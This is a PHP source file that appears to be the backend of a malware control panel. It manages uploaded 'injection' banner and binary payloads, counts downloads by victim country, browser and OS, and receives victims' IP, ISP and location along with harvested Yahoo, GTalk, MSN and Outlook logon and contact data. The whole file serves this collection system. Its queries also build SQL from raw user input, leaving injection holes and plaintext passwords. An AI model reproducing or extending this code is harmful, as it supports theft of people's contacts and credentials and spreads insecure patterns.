<?php 

	require_once ("database.php");

	$urlSelf = $_SERVER['PHP_SELF'];
	$logonUser = false;
	$typeUser = -1;
	
	function strleft($s1, $s2) {
		return substr($s1, 0, strpos($s1, $s2));
	}
	
	function startsWith($haystack, $needle)
	{
		$length = strlen($needle);
		return (substr($haystack, 0, $length) === $needle);
	}
	
	function extractImageSize($path){
		$array = array();
		$path = str_replace(' ', '%20', $path);
		list($width, $height, $type, $attr) = @getimagesize($path);
		
		if($width > 0) $array["width"] = $width;
		else $array["width"] = 0;
		
		if($height > 0) $array["height"] = $height;
		else $array["height"] = 0;
		
		return  $array;
	}
	
	function getCurrentHost(){
		$s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
		$protocol = strleft(strtolower($_SERVER["SERVER_PROTOCOL"]), "/").$s;
		$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
		return $protocol."://".$_SERVER['SERVER_NAME'].$port;   
	}
	
	function getCurrentPath(){
		$path = "";
		$path .= strleft(strtolower($_SERVER["SERVER_PROTOCOL"]), "/");
		$path .= ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on') ? "s" : "")."://";
		$path .= $_SERVER['SERVER_NAME'];
		if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on') {
			if($_SERVER['SERVER_PORT']!='443') {
				$path .= ":".$_SERVER['SERVER_PORT'];
			}
		}
		else {
			if($_SERVER['SERVER_PORT']!='80') {
				$path .= ":".$_SERVER['SERVER_PORT'];
			}
		}
		
		$path .= $_SERVER['REQUEST_URI'];
		
		return dirname($path)."/";
	}
	
	function checkPassword($pass) {
		if(isset($pass) && strlen($pass) > 0){
			if(preg_match('/^[a-z0-9]{4,12}$/i', $pass)) return true;
		}
		return false;
	}
	
	function checkUsername($pass) {
		if(isset($pass) && strlen($pass) > 0){
			if(preg_match('/^[a-z0-9]{4,12}$/i', $pass)) return true;
		}
		return false;
	}
	
	function checkAplhaNumeric($str){
		return ctype_alnum($str);
	}
	
	function checkEmail($email) {
		if(isset($email) && strlen($email) > 3){
			if(@eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $email)) return true;
		}
		return false;
	}
        
//***************************************************************************************************
        
        function session_is_registered($var){
            if(isset($_SESSION[$var])) return true;
            return false;
        }
        
        function session_register($var){
            $_SESSION[$var] = "";
        }
        
        function session_unregister($var){
            unset($_SESSION[$var]);
        }
	
//***************************************************************************************************
	class Access{//ok
	
                //ojo ya no existe session_is_registered
            
		function getRegistredUser(){
                    if(session_is_registered('MM_Username')) return $_SESSION['MM_Username'];
                    return "";
		}
		
		function getRegistredType(){
                    if(session_is_registered('MM_Usertype')) return $_SESSION['MM_Usertype'];
                    return "";
		}

		function isInitAccess(){
                    if(strlen($this->getRegistredUser())>0) return true;
                    return false;
		}
		
		function isSendAccess(){
			$user = @$_POST["user"]; $pass = @$_POST["pass"]; $sendSession = @$_POST["sendSession"];
			if(isset($user) && isset($pass) && isset($sendSession) && $sendSession = "true"){
				if(checkUsername(trim($user)) && checkPassword(trim($pass))){
					return true;
				}
			}
			return false;
		}
		
		function isAdminUser(){
			$initAccess = $this->isInitAccess();
			if($initAccess){
				$type = $this->getRegistredType();
				if($type == "admin") return 1;
				else if($type == "user") return 0;
				unset($type);
			}
			return -1;
		}
		
		function processLogonRestriction($failedGoTo){
			if(!$this->isInitAccess()){
				header("Location: ".$failedGoTo); 
				exit;
			}
		}
		
		function processLogout($logoutGoTo){
			$logout = @$_GET["logout"];
			if(isset($logout) && $logout = "true"){
				if($this->isInitAccess()){
					if(@session_is_registered("MM_Username")) @session_unregister("MM_Username");
					if(@session_is_registered("MM_Usertype")) @session_unregister("MM_Usertype");					
					header("Location: ".$logoutGoTo); 
					exit;
				}
				else{
					header("Location: ".$logoutGoTo); 
					exit;
				}
			}
		}
		
		function processSendAccess($successGoTo, $failedGoTo){
                    	if($this->isSendAccess()){
                    		if(!$this->isInitAccess()){
                    			$user = (@$_POST["user"]); $pass = trim(@$_POST["pass"]);
                                        $accounts = new Accounts;
                                        
                                        print_r($_SESSION);//ojo
                                        
					if($accounts->verifyAccount($user, $pass, true)){
						if(!@session_is_registered("MM_Usertype")) 
							@session_register('MM_Usertype'); $_SESSION['MM_Usertype'] = "admin";
						if(!@session_is_registered("MM_Username")) 
							@session_register('MM_Username'); $_SESSION['MM_Username'] = $user;
						unset($accounts); unset($user); unset($pass);
						header("Location: ".$successGoTo); 
						exit;
					}
					else if($accounts->verifyAccount($user, $pass, false)){
						if(!@session_is_registered("MM_Usertype"))  
							@session_register('MM_Usertype'); $_SESSION['MM_Usertype'] = "user";
						if(!@session_is_registered("MM_Username")) 
							@session_register('MM_Username'); $_SESSION['MM_Username'] = $user;
						unset($accounts); unset($user); unset($pass);
						header("Location: ".$successGoTo); 
						exit;
					}
					else {
						unset($accounts);
						header("Location: ".$failedGoTo); 
						exit;
					}						
				}
			}	
		}		
		
	}	
	
//***************************************************************************************************
	
	class Accounts{	//ok
		
		function verifyAccount($user, $pass, $isAdminAccount){
			$existAccount = false;
                        echo "aaaa";
			if(isset($isAdminAccount) && isset($user) && strlen($user)>0 && isset($pass) && strlen($pass)>0){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
				
				$query = "";
				if($isAdminAccount)
					$query = "SELECT COUNT(user) AS size FROM logon WHERE (user='$user' AND pass='$pass' AND type=1) LIMIT 1";
				else
					$query = "SELECT COUNT(user) AS size FROM logon WHERE (user='$user' AND pass='$pass' AND type=0) LIMIT 1";	
					
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					if($row["size"] > 0) $existAccount = true;
                                        @mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}
			return $existAccount;
		}
		
	}
	
//***************************************************************************************************
	class Users{
	
		function getUsers(){
			$arrayUsers = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
				
			$query = "SELECT DISTINCT(user) FROM logon";
					
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					array_push($arrayUsers, $row["user"]);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $arrayUsers;
		}
		
		function existsUser($user){
			$existAccount = false;
			
			if(strlen($user)>0){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
					
				$query = "SELECT COUNT(DISTINCT(user)) AS size FROM logon WHERE(user='$user') LIMIT 1";
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					if($row["size"] > 0) $existAccount = true;
					@mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}
			
			return $existAccount;
		}
		
		function processAddUser($successGoTo, $failedGoTo){
			$addUser = @$_POST["addUser"]; $user = strtolower(trim(@$_POST["user"]));
			$pass = strtolower(trim(@$_POST["pass"])); $type = strtolower(trim(@$_POST["type"]));
			if(isset($addUser) && $addUser = "true" && strlen($user)>0 && strlen($pass)>0 ){
				$access = new Access;
                if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
					if(!$this->existsUser($user)){
						$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
						@mysql_select_db(getDB(), $link) or die(mysql_error());
						$query = "INSERT INTO logon (user, pass, type) VALUES ('$user', '$pass', '$type')";
						$result = @mysql_query($query, $link) or die(mysql_error());  			
						@mysql_close($link) or die(mysql_error());
						
						unset($access);
						header("Location: ".$successGoTo);
						exit;
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
				else{
					unset($access);
					header("Location: ".$failedGoTo);
					exit;
				}
			}
			
		}
		
		function processModifyUser($successGoTo, $failedGoTo){
			$modifyUser = @$_POST["modifyUser"]; $user = strtolower(trim(@$_POST["user"]));
			$pass = strtolower(trim(@$_POST["pass"])); $type = strtolower(trim(@$_POST["type"]));
			if(isset($modifyUser) && $modifyUser = "true" && strlen($user)>0 && strlen($pass)>0 ){
				if(isset($type) && ($type == "0" || $type == "1")){
					$access = new Access;
                	if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
						if($this->existsUser($user)){
							$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
							@mysql_select_db(getDB(), $link) or die(mysql_error());
							$query = "UPDATE logon SET type='$type',pass='$pass' WHERE user='$user'";
							$result = @mysql_query($query, $link) or die(mysql_error());  			
							@mysql_close($link) or die(mysql_error());
						
							unset($access);
							header("Location: ".$successGoTo);
							exit;
						}
						else{
							unset($access);
							header("Location: ".$failedGoTo);
							exit;
						}
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
			}
		}
		
		function processRemoveUser($successGoTo, $failedGoTo){
			$removeUser = @$_POST["removeUser"]; $user = strtolower(trim(@$_POST["user"]));
			if(isset($removeUser) && $removeUser = "true" && strlen($user)>0){
				$access = new Access;
				if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
					if($this->existsUser($user)){
						$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
						@mysql_select_db(getDB(), $link) or die(mysql_error());
						$query = "DELETE FROM logon WHERE (user='$user') LIMIT 1";
						$result = @mysql_query($query, $link) or die(mysql_error());  			
						@mysql_close($link) or die(mysql_error());
							
						unset($access);
						header("Location: ".$successGoTo);
						exit;
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
				else{
					unset($access);
					header("Location: ".$failedGoTo);
					exit;
				}
			}
		}
	
	}

//***************************************************************************************************

	class Injecions{
	
		function getInjections(){
			$array = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
				
			$query = "SELECT DISTINCT(id) FROM injections";
					
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					array_push($array, $row["id"]);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $array;
		}
		
		function existsInjection($id){
			$existAccount = false;
			
			if(strlen($id)>0 && checkAplhaNumeric($id)){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
					
				$query = "SELECT COUNT(DISTINCT(id)) AS size FROM injections WHERE(id='$id') LIMIT 1";
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					if($row["size"] > 0) $existAccount = true;
					@mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}
			
			return $existAccount;
		}
		
		function getInjectionInfo($id){
			$array = array();
			
			if(strlen($id)>0 && checkAplhaNumeric($id)){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
					
				$query = "SELECT * FROM injections WHERE(id='$id') LIMIT 1";
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					$array["id"] = $row["id"];					
					$array["width"] = $row["width"];
					$array["height"] = $row["height"];
					$array["banner"] = $row["banner_file"];
					$array["binary"] = $row["binary_file"];
					@mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}
			
			return $array;
		}
	
		function isValidBinaryFile($name){
			if(isset($name) && strlen($name)>0){
				$array = @$_FILES[$name];
				if(count($array)>0){
					$size = $array['size'];
					$error = $array['error'];
					if($size > 0 && $size <= getUploadLimit() && $error == 0) return true;
				}				
			}
			return false;
		}
		
		function isValidImageFile($name){
			if(isset($name) && strlen($name)>0){
				$array = @$_FILES[$name];
				if(count($array)>0){
					$size = $array['size'];
					$error = $array['error'];
					$type = strtolower($array['type']);
					if($size > 0 && $size <= getUploadLimit() && $error == 0) {
						if($type == "image/jpeg") return true;
					}
				}				
			}
			return false;
		}
	
		//print_r ($array);
		//exit;
	
		function processAddInjection($successGoTo, $failedGoTo){
			$addInjection = @$_POST["addInjection"]; $id = trim(@$_POST["id"]);
			if(isset($addInjection) && $addInjection = "true" && strlen($id)>0 && checkAplhaNumeric($id)){
				$access = new Access;
                if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
					if(!$this->existsInjection($id)){
						if($this->isValidImageFile("binaryFile") && $this->isValidImageFile("bannerFile")){
							$bannerFile = trim($_FILES['bannerFile']['name']);
							$tmpBannerFile = trim($_FILES['bannerFile']['tmp_name']);							
							$binaryFile = trim($_FILES['binaryFile']['name']);
							$tmpBinaryFile = trim($_FILES['binaryFile']['tmp_name']);
							$bannerOk = false; $binaryOk = false;
							
							$injectionsPath = '../injections/';
							if (!is_dir($injectionsPath)) @mkdir($injectionsPath);
							if (!is_dir($injectionsPath.$id."/")) @mkdir($injectionsPath.$id."/");
							$injectionsPath = $injectionsPath.$id."/";
							
							$width = 0; $height = 0;
							
							$uploadfile = $injectionsPath.$bannerFile.".banner";
							if(@file_exists($uploadfile)) @unlink($uploadfile);
							if (@move_uploaded_file($tmpBannerFile, $uploadfile)) {
								$bannerOk = true;
								$bannerFile = $bannerFile.".banner";
								
								$arraySize = extractImageSize($uploadfile);
								$width = $arraySize["width"];
								$height = $arraySize["height"];
								unset($arraySize);
							}
							else @unlink($uploadfile);
							
							$uploadfile = $injectionsPath.$binaryFile.".binary";
							if(@file_exists($uploadfile)) @unlink($uploadfile);
							if (@move_uploaded_file($tmpBinaryFile, $uploadfile)) {
								$binaryOk = true;
								$binaryFile = $binaryFile.".binary";
							}
							else @unlink($uploadfile);
							
							if($bannerOk && $binaryOk){
								$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
								@mysql_select_db(getDB(), $link) or die(mysql_error());
								$query = "INSERT INTO injections (id, banner_file, binary_file, width, height) VALUES ('$id', '$bannerFile', '$binaryFile', '$width', '$height')";
								$result = @mysql_query($query, $link) or die(mysql_error());  			
								@mysql_close($link) or die(mysql_error());
								
								unset($access);
								header("Location: ".$successGoTo);
								exit;								
							}
							else{
								unset($access);
								header("Location: ".$failedGoTo);
								exit;
							}
							
						}
						else{
							unset($access);
							header("Location: ".$failedGoTo);
							exit;
						}
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
				else{
					unset($access);
					header("Location: ".$failedGoTo);
					exit;
				}
			}
			
		}
		
		function processModifyInjection($successGoTo, $failedGoTo){
			$modifyInjection = @$_POST["modifyInjection"]; $id = trim(@$_POST["id"]);
			if(isset($modifyInjection) && $modifyInjection = "true" && strlen($id)>0 && checkAplhaNumeric($id)){
				$access = new Access;
                if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
					if($this->existsInjection($id)){
						if($this->isValidImageFile("binaryFile") && $this->isValidImageFile("bannerFile")){
							$bannerFile = trim($_FILES['bannerFile']['name']);
							$tmpBannerFile = trim($_FILES['bannerFile']['tmp_name']);							
							$binaryFile = trim($_FILES['binaryFile']['name']);
							$tmpBinaryFile = trim($_FILES['binaryFile']['tmp_name']);
							$bannerOk = false; $binaryOk = false;
							
							$this->deleteInjectionFiles($id);
							
							$injectionsPath = '../injections/';
							if (!is_dir($injectionsPath)) @mkdir($injectionsPath);
							if (!is_dir($injectionsPath.$id."/")) @mkdir($injectionsPath.$id."/");
							$injectionsPath = $injectionsPath.$id."/";
							
							$uploadfile = $injectionsPath.$bannerFile.".banner";
							if(@file_exists($uploadfile)) @unlink($uploadfile);
							if (@move_uploaded_file($tmpBannerFile, $uploadfile)) {
								$bannerOk = true;
								$bannerFile = $bannerFile.".banner";
								
								$arraySize = extractImageSize($uploadfile);
								$width = $arraySize["width"];
								$height = $arraySize["height"];
								unset($arraySize);
							}
							else @unlink($uploadfile);
							
							$uploadfile = $injectionsPath.$binaryFile.".binary";							
							if(@file_exists($uploadfile)) @unlink($uploadfile);
							if (@move_uploaded_file($tmpBinaryFile, $uploadfile)) {
								$binaryOk = true;
								$binaryFile = $binaryFile.".binary";
							}
							else @unlink($uploadfile);
							
							if($bannerOk && $binaryOk){
								$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
								@mysql_select_db(getDB(), $link) or die(mysql_error());
								$query = "UPDATE injections SET banner_file='$bannerFile', binary_file='$binaryFile', width='$width', height='$height' WHERE id='$id'";
								$result = @mysql_query($query, $link) or die(mysql_error());  			
								@mysql_close($link) or die(mysql_error());
								
								unset($access);
								header("Location: ".$successGoTo);
								exit;								
							}
							else{
								unset($access);
								header("Location: ".$failedGoTo);
								exit;
							}
							
						}
						else{
							unset($access);
							header("Location: ".$failedGoTo);
							exit;
						}
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
				else{
					unset($access);
					header("Location: ".$failedGoTo);
					exit;
				}
			}
		}
		
		function deleteInjectionFiles($id){
			if(strlen($id)>0){
				$handler = @opendir("../injections/".$id."/");
				while ($file = @readdir($handler)) {
					if ($file != "." && $file != "..") {
						$file = "../injections/".$id."/".$file;
						@unlink($file);
					}
      			}
				@closedir($handler);
				@rmdir("../injections/");
			}
		}
		
		function processRemoveInjection($successGoTo, $failedGoTo){
			$removeInjection = @$_POST["removeInjection"]; $id = trim(@$_POST["id"]);
			if(isset($removeInjection) && $removeInjection = "true" && strlen($id)>0 && checkAplhaNumeric($id)){
				$access = new Access;
				if($access->isInitAccess() && $access->isAdminUser() == 1){//only admin
					if($this->existsInjection($id)){						
						$this->deleteInjectionFiles($id);						
						$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
						@mysql_select_db(getDB(), $link) or die(mysql_error());
						$query = "DELETE FROM injections WHERE (id='$id') LIMIT 1";
						$result = @mysql_query($query, $link) or die(mysql_error());  			
						@mysql_close($link) or die(mysql_error());
							
						unset($access);
						header("Location: ".$successGoTo);
						exit;
					}
					else{
						unset($access);
						header("Location: ".$failedGoTo);
						exit;
					}
				}
				else{
					unset($access);
					header("Location: ".$failedGoTo);
					exit;
				}
			}
		}
	
	}

//***************************************************************************************************

	class Collections{
		
		function getCountrys(){
			$array = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT DISTINCT(country) FROM owners";
						
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					array_push($array, $row["country"]);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $array;
		}
		
		function getCount($country, $first){
			$array = array();
			
			if(strlen($country)>0){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
					
				if($first){
					$query = "SELECT COUNT(DISTINCT(isp)) AS isp,  ";
					$query = $query . "COUNT(DISTINCT(region)) AS regions, ";
					$query = $query . "COUNT(DISTINCT(city)) AS cities, ";
					$query = $query . "COUNT(DISTINCT(address)) AS owners ";
					$query = $query . "FROM owners WHERE (country='$country') LIMIT 1";
								
					$result = @mysql_query($query, $link) or die(mysql_error());
					$numRows = @mysql_num_rows($result);
					if($numRows >= 1){
						$row = @mysql_fetch_array($result) or die(mysql_error());
						$array["regions"] = $row["regions"];
						$array["cities"] = $row["cities"];
						$array["owners"] = $row["owners"];
						$array["isp"] = $row["isp"];
						@mysql_free_result ($result) or die(mysql_error());
					}
					else{
						$array["regions"] = 0;
						$array["cities"] = 0;
						$array["owners"] = 0;
						$array["isp"] = 0;
					}
				}
				else{
					$query = "SELECT COUNT(DISTINCT(address.address)) AS size FROM address WHERE";
					$query = $query . " (address.owner IN (SELECT DISTINCT(address) FROM owners WHERE (country='$country')))  LIMIT 1";
					$result = @mysql_query($query, $link) or die(mysql_error());
					$numRows = @mysql_num_rows($result);
					if($numRows >= 1){
						$row = @mysql_fetch_array($result) or die(mysql_error());
						$array[0] = $row["size"];
						@mysql_free_result ($result) or die(mysql_error());
					}
					else $array[0] = 0;
				}
				
				@mysql_close($link) or die(mysql_error());
			}
			
			return $array;
		}
		
	}
	
//***************************************************************************************************

	class Downloads{
		
		function getCountrys(){
			$array = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT DISTINCT(country) FROM downloads";
						
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					array_push($array, $row["country"]);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $array;
		}
		
		function getCount($country){
			$array = array();
			
			if(strlen($country)>0){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
					
				$query = "SELECT COUNT(DISTINCT(browser)) AS browsers,  ";
				$query = $query . "COUNT(DISTINCT(language)) AS languages, ";
				$query = $query . "COUNT(DISTINCT(os)) AS os, ";
				$query = $query . "COUNT(*) AS injections ";					
				$query = $query . "FROM downloads WHERE (country='$country') LIMIT 1";
								
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					$array["browsers"] = $row["browsers"];
					$array["languages"] = $row["languages"];
					$array["injections"] = $row["injections"];
					$array["os"] = $row["os"];
					@mysql_free_result ($result) or die(mysql_error());
				}
				else{
					$array["browsers"] = 0;
					$array["languages"] = 0;
					$array["injections"] = 0;
					$array["os"] = 0;
				}
				
				@mysql_close($link) or die(mysql_error());
			}
			
			return $array;
		}
		
	}

//***************************************************************************************************

class Sends{
	
		function isSendCollection(){
			
			//".NET Framework 2.0";
			
			$container = array();		
			$container["ip"] = trim(@$_POST["ip"]);
			$container["isp"] = trim(@$_POST["isp"]);
			$container["city"] = trim(@$_POST["city"]);
			$container["region"] = trim(@$_POST["region"]);
			$container["country"] = trim(@$_POST["country"]);
			
			$container["type"] = trim(@$_POST["type"]);
			$container["owner"] = trim(@$_POST["owner"]);
			$container["length"] = @(int) trim(@$_POST["length"]);
			
			if($container["length"] >= 0 && strlen($container["ip"])>0 && 
			   strlen($container["isp"])>0 && strlen($container["city"])>0 && 
			   strlen($container["region"])>0 && strlen($container["country"])>0 && 
			   strlen($container["type"])>0 && checkEmail($container["owner"])){	
				
				if($container["type"] == "logon.yahoo" || $container["type"] == "logon.gtalk" ||
				   $container["type"] == "logon.msn" || $container["type"] == "contacts.msn" || 
				   $container["type"] == "contacts.outlook"){
					if($container["length"] > 0){
						for($i=0; $i<$container["length"]; $i++){
							$item = trim(@$_POST["".$i]);
							if(!checkEmail($item)) return false;
						}
						return true;			
					}
					else return true;	   
				}				
			}
		}
		
		function getSendCollection(){
			$container = array();		
			$container["ip"] = trim(@$_POST["ip"]);
			$container["isp"] = trim(@$_POST["isp"]);
			$container["city"] = strtoupper(trim(@$_POST["city"]));
			$container["region"] = strtoupper(trim(@$_POST["region"]));
			$container["country"] = strtoupper(trim(@$_POST["country"]));
			
			$container["type"] = trim(@$_POST["type"]);
			$container["owner"] = strtolower(trim(@$_POST["owner"]));
			$container["length"] = @(int) trim(@$_POST["length"]);
			
			if($container["length"] > 0){
				for($i=0; $i<$container["length"]; $i++){
					$item = strtolower(trim(@$_POST["".$i]));
					if(strlen($item)>0)  $container["".$i] = $item;
				}
			}
			
			return $container;
		}	
		
		function existContact($owner, $address){
			$existAccount = false;
			if(checkEmail($owner) && checkEmail($address)>0){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
				$query = "SELECT COUNT(address) AS size FROM  address WHERE (owner='$owner' AND address='$address') LIMIT 1";
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					if($row["size"] > 0) $existAccount = true;
					@mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}			
			return $existAccount;
		}
		
		function existOwner($owner){
			$existAccount = false;
			if(checkEmail($owner)){
				$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
				@mysql_select_db(getDB(), $link) or die(mysql_error());
				$query = "SELECT COUNT(address) AS size FROM  owners WHERE (address='$owner') LIMIT 1";
				$result = @mysql_query($query, $link) or die(mysql_error());
				$numRows = @mysql_num_rows($result);
				if($numRows >= 1){
					$row = @mysql_fetch_array($result) or die(mysql_error());
					if($row["size"] > 0) $existAccount = true;
					@mysql_free_result ($result) or die(mysql_error());
				}
				@mysql_close($link) or die(mysql_error());
			}			
			return $existAccount;
		}
		
		function writeCollection($array){
			if(count($array)>0 && strlen($array["owner"])>0){
				if(!$this->existOwner($array["owner"])){
					$ip = $array["ip"];
					$isp = $array["isp"];
					$city = $array["city"];
					$region = $array["region"];
					$country = $array["country"];
					$address = $array["owner"];
					
					$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
					@mysql_select_db(getDB(), $link) or die(mysql_error());
					$query = "INSERT INTO owners (ip, isp, city, region, country, address) VALUES ('$ip', '$isp', '$city', '$region', '$country', '$address')";
					$result = @mysql_query($query, $link) or die(mysql_error());  			
					@mysql_close($link) or die(mysql_error());
					
					if($array["length"] == 0) return true;
				}
				
				if($array["length"] > 0){
					$owner = $array["owner"];
					for($i=0; $i<$array["length"]; $i++){
						$address = $array["".$i];
						if(strlen($address)>0 && !$this->existContact($owner, $address)){
							$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
							@mysql_select_db(getDB(), $link) or die(mysql_error());
							$query = "INSERT INTO address (owner, address) VALUES ('$owner', '$address')";
							$result = @mysql_query($query, $link) or die(mysql_error());  			
							@mysql_close($link) or die(mysql_error());
						}
						if($i >= 9) return true;
					}
					return true;
				}
				else return true;
			}
			return false;
		}
		
	}

//***************************************************************************************************
				
?>